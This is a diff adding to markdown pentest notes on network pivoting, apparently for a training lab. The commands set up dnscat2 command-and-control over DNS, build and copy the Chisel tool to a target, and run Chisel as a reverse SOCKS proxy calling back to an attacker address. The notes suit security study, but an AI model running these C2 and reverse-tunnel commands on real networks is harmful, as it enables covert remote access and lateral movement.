@@ -216,7 +216,7 @@ Verify it worked
 ```cmd
 netsh.exe interface portproxy show v4tov4
 ```
-**DNScat2**
+**Dnscat2**
 *It's just a C2 over encrypted DNS*
 Install
 ```
@@ -224,7 +224,9 @@ git clone https://github.com/iagox86/dnscat2.git
 ```
 Server Start
 ```
+```
  sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
+```
 ```
 If you want PowerShell use `dnscat2-powershell`
 Install 
@@ -241,3 +243,35 @@ Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecre
 ```
 *You must use pre-shared secret*
 
+**FreeRDP**
+```
+xfreerdp /v:<rdp-server> /u:<user> /p:<pass>
+```
+
+**Chisel**
+*SOCKS5 Proxy*
+Install
+```
+git clone https://github.com/jpillora/chisel.git
+cd chisel
+go build
+```
+Transfer bin to another host 
+```
+scp chisel <user>@<target-ip>:~/
+```
+Running on a pivot host
+```
+./chisel server -v -p 1234 --socks5
+```
+Running on the pivot
+```
+./chisel client -v <pivot-host>:1234 socks
+```
+Reverse Proxy
+```
+sudo ./chisel server --reverse -v -p 1234 --socks5
+```
+```
+./chisel client -v 10.10.14.17:1234 R:socks
+```
